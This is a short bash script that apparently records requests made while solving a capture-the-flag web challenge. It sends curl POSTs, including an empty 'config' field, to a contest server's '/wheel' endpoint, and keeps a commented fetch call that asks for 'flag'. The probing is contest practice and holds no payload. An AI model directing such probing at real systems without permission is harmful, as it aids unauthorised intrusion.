#!/usr/bin/env bash

url=http://chal.cybersecurityrumble.de:7780
curl $url/wheel --data-raw 'name=hello&image_num=1&diameter=5'
curl $url/wheel --data-raw 'config='

# await fetch("http://chal.cybersecurityrumble.de:7780/wheel", {
#     "credentials": "omit",
#     "headers": {
#         "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0",
#         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
#         "Accept-Language": "en-US,en;q=0.5",
#         "Content-Type": "application/x-www-form-urlencoded",
#         "Upgrade-Insecure-Requests": "1",
#         "Pragma": "no-cache",
#         "Cache-Control": "no-cache"
#     },
#     "referrer": "http://chal.cybersecurityrumble.de:7780/wheel",
#     "body": "name=flag&image_num=1&diameter=5",
#     "method": "POST",
#     "mode": "cors"
# });

